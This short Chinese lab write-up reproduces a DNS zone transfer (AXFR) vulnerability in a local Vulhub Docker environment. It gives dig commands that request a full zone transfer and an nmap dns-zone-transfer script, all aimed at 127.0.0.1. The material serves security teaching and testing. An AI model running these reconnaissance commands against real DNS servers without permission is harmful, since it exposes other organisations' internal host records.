开启环境：
```
docker compose up -d
```
因为环境问题，修改靶场
```
ports: - "15353:53/tcp"     
       - "15353:53/udp"
```

使用dig命令来发送dns请求
获取域名`www.vulhub.org`在目标dns服务器上的A记录：
```
dig @127.0.0.1 -p 15353 www.vulhub.org
```
发送axfr类型的dns请求：
```
dig @127.0.0.1 -p 15353 -t axfr vulhub.org
```
可以获取到`vulhub.org`的所有自愈明记录
而这里存在DNS域传送漏洞

也可以用nmap script来扫描漏洞：
```
nmap --script dns-zone-transfer \
  --script-args "dns-zone-transfer.server=127.0.0.1,dns-zone-transfer.port=15353,dns-zone-transfer.domain=vulhub.org" \
  -Pn 127.0.0.1
```
